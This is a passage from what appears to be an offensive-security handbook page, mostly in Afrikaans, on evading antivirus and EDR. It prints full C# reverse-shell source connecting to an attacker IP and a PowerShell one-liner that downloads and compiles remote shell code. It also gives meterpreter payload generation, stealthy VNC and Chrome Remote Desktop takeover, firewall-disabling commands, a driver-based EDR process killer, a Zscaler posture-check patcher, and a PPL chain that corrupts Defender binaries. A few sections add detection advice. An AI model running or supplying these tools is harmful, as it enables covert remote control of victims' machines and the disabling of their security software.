Jy kan ook C# Assemblies **from PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **to the interpreter environment installed on the Attacker Controlled SMB share**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB share toe te laat, kan jy **execute arbitrary code in these languages within memory** van die gekompromitteerde masjien.

Die repo dui aan: Defender scan nog steeds die skripte maar deur Go, Java, PHP ensovoorts te gebruik het ons **meer buigbaarheid om static signatures te omseil**. Toetsing met lukrake on-obfuscated reverse shell skripte in hierdie tale het sukses bewys.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om **die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer**, wat hulle in staat stel om die privilegies te verlaag sodat die proses nie sterf nie maar nie die regte permissies het om na kwaadwilligheid te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit dan te gebruik om dit oor te neem en persistentie te behou:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installer stil in die slagoffer uit (administrateur vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop bladsy en klik next. Die wizard sal jou dan vra om te magtig; klik die Authorize knoppie om voort te gaan.
4. Voer die gegewe parameter met 'n paar aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin sonder die GUI te stel).

## Advanced Evasion

Evasie is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie op een stelsel in ag neem, so dit is byna onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n voetegrond te kry in meer Advanced Evasion tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hier is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Oude Tegnieke**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat sal **verwyder dele van die binary** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit vir jou opsplit.\
Nog 'n instrument wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows 'n **Telnet server** meegekom wat jy kon installeer (as administrateur) deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die nuut geskepte lêer _**UltraVNC.ini**_ na die **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit voorberei is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te behou moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [die config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir 'n voorbeeld van build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Deaktiveer AV/EDR vanaf kernel-ruimte

Storm-2603 het 'n klein konsole-hulpmiddel, bekend as **Antivirus Terminator**, benut om endpoint-beskerming te deaktiveer voordat ransomware geplaas is. Die hulpmiddel bring sy **eie kwesbare maar *signed* driver** en misbruik dit om voorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Ondertekende driver**: Die lêer wat na skyf afgelewer word is `ServiceMouse.sys`, maar die binêr is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Bedienerinstallasie**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs wat deur die driver blootgestel word**
| IOCTL code | Funksie                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimale C bewys-van-konsep:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**:  BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse open, hulle termineeer, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verhardingsfunksies.

Opsporing / Mitigering
•  Skakel Microsoft se vulnerable-driver bloklys in (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.  
•  Monitor skeppings van nuwe *kernel* services en gee waarskuwing wanneer 'n driver van 'n world-writable gids gelaai word of nie op die allow-list is nie.  
•  Hou oog vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl` oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture-reëls lokaal toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerp-keuses maak 'n volledige omseiling moontlik:

1. Posture-evaluasie gebeur **heeltemal client-side** (n boolean word na die bediener gestuur).
2. Interne RPC-endpoints valideer slegs dat die verbindende uitvoerbare lêer **signed by Zscaler** is (via `WinVerifyTrust`).

Deur vier signed binaries op skyf te patch kan albei meganismes geneutraliseer word:

| Binary | Oorspronklike logika gepatch | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` so elke kontrole is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimale patcher-uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Al** houdingskontroles vertoon **groen/ooreenstemmend**.
* Ongeteken of gewysigde binaries kan die named-pipe RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer verkry onbeperkte toegang tot die interne netwerk soos deur die Zscaler-beleide gedefinieer.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertroubesluite en eenvoudige handtekeningkontroles met 'n paar byte-wysigings verslaan kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) afdwing 'n ondertekenaar-/vlakhiërargie sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Offensief: as jy 'n PPL-enabled binary wettiglik kan loods en die argumente beheer, kan jy onskuldige funksionaliteit (bv. logging) omskakel in 'n beperkte, deur PPL-ondersteunde write primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL uitgevoer word
- Die teiken EXE (en enige gelaaide DLLs) moet geteken wees met 'n PPL-geskikte EKU.
- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet versoek word wat by die ondertekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal by skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente deur na die teiken EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitief: ClipUp.exe
- Die gesigneerde stelsel-binaire `C:\Windows\System32\ClipUp.exe` begin 'n nuwe proses van homself en aanvaar 'n parameter om 'n loglêer na 'n deur die oproeper-gespesifiseerde pad te skryf.
- Wanneer as 'n PPL-proses gelanseer, vind die lêerskryf plaas met PPL-beskerming.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 kortpaaie om na normaalweg beskermde plekke te wys.

8.3 short path helpers
- Lys kortname: `dir /x` in elke ouer-gids.
- Ontleed kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (bv. CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (bv. Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (bv. MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer behalwe die plasing nie; die primitief is geskik vir korrupsie eerder as vir presiese inhoudsinspuiting.
- Vereis local admin/SYSTEM om 'n diens te installeer/start en 'n herlaai-venster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering by opstart vermy file locks.

Opsporing
- Proses skepping van `ClipUp.exe` met ongewone argumente, veral geparent deur nie-standaard launchers, rondom opstart.
- Nuwe dienste gekonfigureer om verdagte binaries outomaties te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/modifikasie voorafgaande aan Defender-opstartfoute.
- Lêerintegriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/modifikasies deur prosesse met protected-process-vlagte.
- ETW/EDR telemetry: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlakgebruik deur nie-AV binaries.

Teenmaatreëls
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-oproep buite geldige konteks.
- Dienshigiëne: beperk skepping/modifikasie van auto-start dienste en monitor manipulasie van opstartorde.
- Maak seker Defender tamper protection en early-launch protections is aangeskakel; ondersoek opstartfoute wat op binary-korrupsie dui.
- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves uit te skakel indien versoenbaar met jou omgewing (toets deeglik).

Verwysings vir PPL en gereedskap
- Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniekbeskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Verwysings

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
